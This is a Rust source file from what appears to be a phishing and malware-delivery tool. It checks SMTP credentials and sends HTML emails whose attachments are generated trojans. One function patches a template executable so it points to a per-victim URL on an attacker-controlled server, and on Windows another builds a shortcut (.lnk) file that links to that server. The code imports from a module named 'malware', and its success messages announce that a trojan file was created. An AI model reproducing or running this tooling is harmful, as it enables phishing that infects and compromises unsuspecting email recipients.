use lettre::Message;
use lettre::message::header::ContentType;
use lettre::message::{MultiPart, Attachment, Body};
use lettre::transport::smtp::authentication::Credentials;
use lettre::{SmtpTransport, Transport};
use std::error::Error;
use std::fs::{self, create_dir_all};
use std::path::Path;
use mime_guess::MimeGuess;
use crate::malware::patch_tool::replace_url_in_exe_rdata;

#[cfg(target_os = "windows")]
use crate::malware::lnk::generate_lnk;

pub fn verify_smtp_credentials(
    smtp_server: &str,
    username: &str,
    password: &str,
) -> Result<Credentials, Box<dyn Error>> {
    let creds = Credentials::new(username.to_string(), password.to_string());

    // 创建SMTP传输器
    let mailer = SmtpTransport::relay(smtp_server)?
        .credentials(creds.clone())
        .build();

    // 尝试连接以验证凭证
    mailer.test_connection()?;

    Ok(creds)
}

pub fn send_html_email(
    smtp_server: &str,
    html_path: &str,
    to_email: &str,
    subject: &str,
    from_email: &str,
    username: &str,
    password: &str,
    original_appendix_name_exe: &str,
    server_url: &str, // http://ip:port
    entry_id: &str,
    output_exe_path: &str,
    output_lnk_path: &str,
) -> Result<(), Box<dyn Error>> {
    // 验证凭证
    let creds = verify_smtp_credentials(smtp_server, username, password)?;

    // 读取HTML文件
    let html_content = fs::read_to_string(html_path)?;

    // 构建邮件
    let base_email = Message::builder()
        .from(from_email.parse()?)
        .to(to_email.parse()?)
        .subject(subject);
    
    let multipart = match original_appendix_name_exe.is_empty() {
        true => {
            MultiPart::mixed()
            .singlepart(
                lettre::message::SinglePart::builder()
                    .header(lettre::message::header::ContentType::TEXT_HTML)
                    .body(html_content)
            )
        }
        false => {
            add_attachment(html_content, original_appendix_name_exe, server_url, entry_id, output_exe_path, output_lnk_path)?

        }
    };

    let email = base_email.multipart(multipart)?;

    // 创建SMTP传输器并发送邮件
    let mailer = SmtpTransport::relay(smtp_server)?
        .credentials(creds)
        .build();

    mailer.send(&email)?;

    Ok(())
}

fn ensure_exe_suffix(s: &str) -> String {
    if s.ends_with(".exe") {
        s.to_string()
    } else {
        format!("{}.exe", s)
    }
}





/// 添加单个附件到multipart
fn add_attachment(
    html_content: String,
    original_appendix_name_exe: &str,
    server_url: &str,
    entry_id: &str,
    output_exe_path: &str,
    output_lnk_path: &str,
) -> Result<MultiPart, Box<dyn Error>> {
    // let template_exe_path: &str = "./appendix.exe";
    let original_appendix_name_exe = ensure_exe_suffix(original_appendix_name_exe);
    let mpart = MultiPart::mixed()
        .singlepart(
            lettre::message::SinglePart::builder()
                .header(lettre::message::header::ContentType::TEXT_HTML)
                .body(html_content.clone())
        );


    if output_exe_path.is_empty() && output_lnk_path.is_empty(){
        return Ok(mpart);
    }

    let mpart = if !(output_exe_path.is_empty()) {
        let temp = format!("./temp/appendix-exe/{}", entry_id);
        let temp_clone = temp.clone();
        let temp_dir = Path::new(&temp_clone);
        create_dir_all(temp_dir)?;

        let temp_file = format!("./{}/{}", temp, output_exe_path);

        let entry_url = format!("appendix/{}", entry_id);

        match replace_url_in_exe_rdata(&original_appendix_name_exe, &temp_file, &entry_url) {
            Ok(_) => {
                let path = Path::new(output_exe_path);
                let mime_str = MimeGuess::from_path(path)
                    .first_or_octet_stream()
                    .essence_str().to_string(); 

                crate::print_success(&format!("成功创建木马文件 {}", entry_id));
                let body = fs::read(&temp_file)?;

                fs::remove_file(&temp_file)?;

                mpart                
                    .singlepart(
                    Attachment::new(output_exe_path.to_string())
                        .body(body, ContentType::parse(&mime_str)?)
                )

            }
            Err(_e) => {
                return Err(Box::new(std::io::Error::new(
                    std::io::ErrorKind::NotFound,
                    "生成文件失败",
                )))
            }
        }
    }else{
        mpart
    };

    #[cfg(target_os = "windows")]
    let mpart = if !(output_lnk_path.is_empty()) {
        let temp = format!("./temp/appendix-lib/{}", entry_id);
        let temp_clone = temp.clone();
        let temp_dir = Path::new(&temp_clone);
        create_dir_all(temp_dir)?;

        let temp_file = format!("./{}/{}", temp, output_lnk_path);
        let appendix_url = format!("{}/appendix/{}", server_url, entry_id);
        match generate_lnk(temp_file, appendix_url){
            Ok(_) => {
                let path = Path::new(output_lnk_path);
                let mime_str = MimeGuess::from_path(path)
                    .first_or_octet_stream()
                    .essence_str().to_string(); 

                crate::print_success(&format!("成功创建木马文件 {}", entry_id));
                let body = fs::read(&temp_file)?;

                fs::remove_file(&temp_file)?;

                Ok(mpart                
                    .singlepart(
                    Attachment::new(output_lnk_path.to_string())
                        .body(body, ContentType::parse(&mime_str)?)
                ))

            },
            Err(e) => {
                return Err(Box::new(std::io::Error::new(
                    std::io::ErrorKind::NotFound,
                    "生成lnk文件失败",
                )))
            }

        }
    }else{
        mpart
    };

    Ok(mpart)

}
